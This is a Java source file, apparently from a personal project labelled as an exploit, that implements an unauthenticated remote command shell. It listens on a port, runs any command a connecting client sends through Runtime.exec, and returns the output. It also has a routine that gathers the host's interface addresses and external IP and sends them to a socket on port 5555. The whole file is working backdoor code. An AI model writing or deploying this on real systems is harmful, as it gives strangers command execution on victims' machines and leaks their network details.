import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Enumeration;

class Terminal {
	private static ServerSocket server;
	private static BufferedReader cmdAnswerReader;
	private static Process process;
	private static String BasisVerzeichnis = "/Users/cigerxwinchaker/Desktop/EigendeProjekte/java_Projekt_Exploit/";

	public InputStream exec(String command) throws InterruptedException, IOException {
		try {
			process = null;
			process = Runtime.getRuntime().exec(command, null, new File(BasisVerzeichnis));
		} catch (IOException e) {
			return null;
		}
		return process.getInputStream();
	}

	public static void handleRequest(String basePath, Socket clientSo) throws IOException, InterruptedException {
		Terminal.BasisVerzeichnis = basePath;
		Terminal terminal = new Terminal();
		BufferedReader clientInput = new BufferedReader(new InputStreamReader(clientSo.getInputStream()));
		PrintWriter clientOutput = new PrintWriter(clientSo.getOutputStream(), true);
		clientOutput.println("...reached CMD...");
		String cmdAnswerLine = null;

		while (!clientSo.isClosed()) {
			clientOutput.println("Befehl > ");
			String clientRequest = clientInput.readLine();
			if (clientRequest != null) {
				if (clientRequest.equals("exit")) {
					clientOutput.println("All Systems shutdown... ");
					server.close();
					System.exit(0);
				} else if (clientRequest.equals("leave")) {
					clientSo.close();
				} else if (clientRequest.equals("ch")) {
					clientOutput.println("new Basedirectory > ");
					String clientRequest1 = clientInput.readLine();
					Terminal.BasisVerzeichnis = clientRequest1;
					clientOutput.println("new Basedirectory =  " + Terminal.BasisVerzeichnis);
				} else {
					try {
						cmdAnswerReader = new BufferedReader(new InputStreamReader(terminal.exec(clientRequest)));
						while ((cmdAnswerLine = cmdAnswerReader.readLine()) != null && !clientSo.isClosed()) {
							clientOutput.println(cmdAnswerLine);
						}
					} catch (java.lang.NullPointerException exception) {
						clientOutput.println("Command not working here for any reason.");
					}

				}
			} else {
				System.out.println("No messages");
				break;
			}
			clientOutput.println("\n !!! Request executed !!!\n");
		}
	}
	
	static public String getExternIP() throws IOException {
		URL whatismyip = new URL("http://checkip.amazonaws.com");
		BufferedReader in = new BufferedReader(new InputStreamReader(
		                whatismyip.openStream()));
		String ip = null;
		try {
			ip = in.readLine();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return ip;
	}
	
	static public String getInternIP() {
		String ip;
		String result="";
	    try {
	        Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
	        while (interfaces.hasMoreElements()) {
	            NetworkInterface iface = interfaces.nextElement();
	            if (iface.isLoopback() || !iface.isUp()) {
	                continue;
	            }
	            Enumeration<InetAddress> addresses = iface.getInetAddresses();
	            while(addresses.hasMoreElements()) {
	                InetAddress addr = addresses.nextElement();
	                ip = addr.getHostAddress();
	                result += (iface.getDisplayName() + " " + ip + "\n");
	            }
	        }
	    } catch (SocketException e) {
	        throw new RuntimeException(e);
	    }
	    return result;
	}
	
    public static void sendInformations() throws UnknownHostException, IOException {
        Socket client = new Socket("localhost", 5555);
        DataOutputStream dataOutput = new DataOutputStream(client.getOutputStream());

        if(client.isConnected()) {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            while (ifaces.hasMoreElements()) {
                NetworkInterface ni = (NetworkInterface) ifaces.nextElement();
                dataOutput.writeUTF(ni.getName() + ":");
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress ia = (InetAddress) addrs.nextElement();
                    dataOutput.writeUTF(" " + ia.getHostAddress());
                }
            }
            dataOutput.writeUTF(getExternIP());
        }
        client.close();
    }

	public static void main(String[] args) throws SocketException {
		
		if (args.length > 1 ) {
			try {
				server = new ServerSocket(Integer.valueOf(args[0]));
			} catch (IOException e) {
				e.printStackTrace();
			}
			while (true) {
				System.out.println("Server started, waiting for client"); // nur für tests
				try {
					Socket clientSo = server.accept();
					handleRequest(args[1], clientSo);
				} catch (IOException | InterruptedException e) {
					e.printStackTrace();
				}
			}
		} else {
			System.err.println("MISSING Arguments java Terminal [Port] [Path]");
		}
	}
	
}
